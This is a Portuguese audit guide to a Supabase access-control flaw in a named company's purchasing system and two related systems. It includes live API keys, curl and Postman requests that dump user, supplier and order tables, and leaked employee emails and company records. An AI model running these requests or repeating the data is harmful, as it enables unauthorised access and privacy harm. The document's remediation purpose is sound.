# Guia Técnico de Auditoria, Postman e Amostras de Dados do Supabase

**Sistema Auditado:** Sistema de Gestão de Compras (`compras.teninternet.com.br`)  
**Backend:** Supabase Cloud (`https://bxvblyktxwaqosjvjpwa.supabase.co`)  
**Objetivo:** Fornecer à equipe de TI e auditoria o material para reprodução da falha via Postman, visualização das amostras de dados que foram expostos e validação da correção.

---

## 1. Credenciais e Tokens de Acesso do Sistema de Compras

A aplicação front-end conecta-se diretamente ao Supabase através da sua API REST (PostgREST). As credenciais utilizadas são:

| Parâmetro | Valor Identificado |
| :--- | :--- |
| **Supabase URL** | `https://bxvblyktxwaqosjvjpwa.supabase.co` |
| **Chave Anônima (Public Anon Key)** | `sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr` |
| **REST API Base Path** | `https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1` |
| **Auth API Base Path** | `https://bxvblyktxwaqosjvjpwa.supabase.co/auth/v1` |

---

## 2. Como Essas Credenciais São Obtidas no Sistema de Compras

Qualquer usuário com um navegador comum consegue extrair essas credenciais em menos de 1 minuto através de dois caminhos simples:

### Método A: Via Ferramentas de Desenvolvedor (DevTools / F12)
1. Acesse `https://compras.teninternet.com.br/` ou `https://compras.teninternet.com.br/login.html`.
2. Pressione `F12` (ou botão direito do mouse -> **Inspecionar**).
3. Vá para a aba **Sources** (Fontes) -> navegue na árvore de arquivos até:
   `compras.teninternet.com.br` ➔ `js` ➔ `config` ➔ `supabase-config.js`.
4. O arquivo contém em texto claro:
   ```javascript
   const SUPABASE_URL = 'https://bxvblyktxwaqosjvjpwa.supabase.co';
   const SUPABASE_ANON_KEY = 'sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr';
   ```

### Método B: Pela Aba Network (Rede)
1. Na aba **Network** do DevTools, recarregue a página (`F5`).
2. Filtre por `supabase` ou clique em qualquer requisição enviada para o domínio `supabase.co`.
3. Nos **Request Headers** da requisição, inspecione os cabeçalhos:
   * `apikey`: exibe a chave `sb_publishable_-...`
   * `Authorization`: exibe `Bearer sb_publishable_-...`

---

## 3. Como Reproduzir e Auditar via Postman (Passo a Passo)

Para validar a falha e demonstrar a exposição dos dados para a liderança técnica, utilize o Postman conforme as instruções abaixo:

### 3.1. Configuração Global da Requisição no Postman
1. Abra o Postman e crie uma nova aba de requisição (`+`).
2. Defina o método como **GET**.
3. Na aba **Headers** da requisição, adicione obrigatoriamente os dois cabeçalhos:

| Key | Value |
| :--- | :--- |
| `apikey` | `sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr` |
| `Authorization` | `Bearer sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr` |
| `Content-Type` | `application/json` |

---

### 3.2. Endpoints para Demonstração de Auditoria

#### 1. Consulta à Tabela de Empresas (`companies`)
* **Método:** `GET`
* **URL:** `https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/companies?select=*`
* **Comando cURL equivalente:**
  ```bash
  curl -X GET "https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/companies?select=*" \
    -H "apikey: sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr" \
    -H "Authorization: Bearer sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr"
  ```

#### 2. Consulta à Tabela de Usuários (`users`)
* **Método:** `GET`
* **URL:** `https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/users?select=id,name,email,role,is_active`
* **Comando cURL equivalente:**
  ```bash
  curl -X GET "https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/users?select=id,name,email,role,is_active" \
    -H "apikey: sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr" \
    -H "Authorization: Bearer sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr"
  ```

#### 3. Consulta à Tabela de Pedidos de Compra (`purchase_orders`)
* **Método:** `GET`
* **URL:** `https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/purchase_orders?select=*&limit=10`
* **Comando cURL equivalente:**
  ```bash
  curl -X GET "https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/purchase_orders?select=*&limit=10" \
    -H "apikey: sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr" \
    -H "Authorization: Bearer sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr"
  ```

#### 4. Consulta à Tabela de Fornecedores (`suppliers`)
* **Método:** `GET`
* **URL:** `https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/suppliers?select=*&limit=10`
* **Comando cURL equivalente:**
  ```bash
  curl -X GET "https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/suppliers?select=*&limit=10" \
    -H "apikey: sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr" \
    -H "Authorization: Bearer sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr"
  ```

#### 5. Consulta à Tabela de Cotações (`quotes`)
* **Método:** `GET`
* **URL:** `https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/quotes?select=*&limit=10`
* **Comando cURL equivalente:**
  ```bash
  curl -X GET "https://bxvblyktxwaqosjvjpwa.supabase.co/rest/v1/quotes?select=*&limit=10" \
    -H "apikey: sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr" \
    -H "Authorization: Bearer sb_publishable_-y45v45dMdwN9eJjPlqSdQ_R52aBObr"
  ```

---

## 4. Amostras de Dados que Foram Expostos

Abaixo estão os dados reais extraídos pelo invasor conforme comprovado nas capturas de tela encaminhadas:

### 4.1. Tabela `companies` (Empresas do Grupo Ten)
*(Extraído diretamente da Imagem 1 no item `=== 4. companies ===`)*

```json
[
  {
    "id": "33ebf0c3-bc26-4db4-b12e-9c158bd0e607",
    "name": "TEN INTERNET LTDA",
    "cnpj": "03.989.716/0001-51",
    "created_at": "2026-01-27T19:21:54.520951+00:00"
  },
  {
    "id": "d46b34b9-eda9-4937-b018-4b833bd89f16",
    "name": "TEN SOLUÇÕES SERVICOS E TECNOLOGIA LTDA",
    "cnpj": "44.899.325/0001-23",
    "created_at": "2026-01-28T22:09:05.898563+00:00"
  },
  {
    "id": "fc4f8bf8-0cf9-4011-952c-15a3936d23de",
    "name": "TEN LOCAÇÃO DE EQUIPAMENTO LTDA",
    "cnpj": "29.864.822/0001-00",
    "created_at": "2026-01-28T22:20:57.635935+00:00"
  }
]
```

### 4.2. Tabela `users` (Colaboradores e Administradores)
*(Extraído da Imagem 1)*

```json
[
  {
    "id": "...",
    "name": "Financeiro",
    "email": "financeiro@teninternet.com.br",
    "role": "admin",
    "is_active": true
  },
  {
    "id": "37e42705-2043-4485-ae7f-80941385d9f9",
    "name": "Edriano",
    "email": "edriano.conceicao@teninternet.com.br",
    "role": "admin",
    "is_active": true
  }
]
```

### 4.3. Estrutura das Demais Tabelas Auditadas
* **`purchase_orders`:** Contém `id`, `protocol`, `description`, `department_id`, `company_id`, `requester_email`, `status`, `total_amount`, `created_at`.
* **`quotes`:** Contém `id`, `purchase_order_id`, `supplier_id`, `items`, `payment_conditions`, `attachment_url`, `total_price`.
* **`suppliers`:** Contém `id`, `name`, `cnpj`, `contact_name`, `phone`, `email`, `category_id`, `rating`.
* **`stock`:** Contém `id`, `product_name`, `quantity`, `unit`, `location`, `updated_at`.

---

## 5. Como Validar no Postman Após a Aplicação das Correções

Após executar os comandos SQL de ativação do **Row Level Security (RLS)** e desativar o cadastro público no Supabase:

1. Reenvie as mesmas requisições no Postman utilizando apenas a chave pública `anonKey`.
2. **Resultado esperado pós-correção:**
   * O Postman deverá retornar **`HTTP 200 []` (Array vazio)** para tabelas com RLS ativo que exigem autenticação.
   * Não será retornado nenhum registro, nenhum dado de empresa, nenhum usuário e nenhum pedido de compra.
3. Se um usuário anônimo tentar fazer `POST /auth/v1/signup`, a API responderá com erro informando que o cadastro público está desabilitado (`Signups not allowed`).

---

## 6. Auditoria dos Demais Projetos Supabase Identificados na Empresa

Durante o mapeamento ampliado de subdomínios, identificamos outros **dois sistemas** utilizando projetos Supabase distintos com a mesma configuração de vulnerabilidade:

### 6.1. Projeto 2: Sistema de Controle de Testes e Ideias (`controle-testes.teninternet.com.br`)
* **Supabase URL:** `https://ambvtfqqkmmyewygibvr.supabase.co`
* **Anon Key:** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFtYnZ0ZnFxa21teWV3eWdpYnZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3MTQ4ODcsImV4cCI6MjA4NTI5MDg4N30.eYbiO6BqXDfqJbMOW9SNBQFmcF3RFgpxWLWN2rV5KEo`
* **Status Auth:** `"disable_signup": false` e `"mailer_autoconfirm": true` (Cadastro público e confirmação automática de e-mail ativas).
* **Tabelas para Auditoria no Postman:**
  * `profiles` (Perfis de colaboradores)
  * `ideas` (Ideias registradas)
  * `sectors` / `sector_managers` (Setores e gestores)
  * `user_points` / `user_roles`
* **Exemplo de Consulta no Postman / cURL:**
  ```bash
  curl -X GET "https://ambvtfqqkmmyewygibvr.supabase.co/rest/v1/profiles?select=*&limit=5" \
    -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFtYnZ0ZnFxa21teWV3eWdpYnZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3MTQ4ODcsImV4cCI6MjA4NTI5MDg4N30.eYbiO6BqXDfqJbMOW9SNBQFmcF3RFgpxWLWN2rV5KEo" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFtYnZ0ZnFxa21teWV3eWdpYnZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3MTQ4ODcsImV4cCI6MjA4NTI5MDg4N30.eYbiO6BqXDfqJbMOW9SNBQFmcF3RFgpxWLWN2rV5KEo"
  ```

---

### 6.2. Projeto 3: Sistema de Avaliações Ciclos (`ciclos.teninternet.com.br`)
* **Supabase URL:** `https://iiawccmlqwocvkfquhhd.supabase.co`
* **Anon Key:** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlpYXdjY21scXdvY3ZrZnF1aGhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjAxNTUzMzcsImV4cCI6MjA3NTczMTMzN30.6QLlf1q-73vzQ6h1Fz1PJ0ooPkQQiyxmTostsZj-BXU`
* **Status Auth:** `"disable_signup": false` e `"mailer_autoconfirm": true`.
* **Tabelas para Auditoria no Postman:**
  * `users`
  * `system_config`
* **Exemplo de Consulta no Postman / cURL:**
  ```bash
  curl -X GET "https://iiawccmlqwocvkfquhhd.supabase.co/rest/v1/users?select=*&limit=5" \
    -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlpYXdjY21scXdvY3ZrZnF1aGhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjAxNTUzMzcsImV4cCI6MjA3NTczMTMzN30.6QLlf1q-73vzQ6h1Fz1PJ0ooPkQQiyxmTostsZj-BXU" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlpYXdjY21scXdvY3ZrZnF1aGhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjAxNTUzMzcsImV4cCI6MjA3NTczMTMzN30.6QLlf1q-73vzQ6h1Fz1PJ0ooPkQQiyxmTostsZj-BXU"
  ```

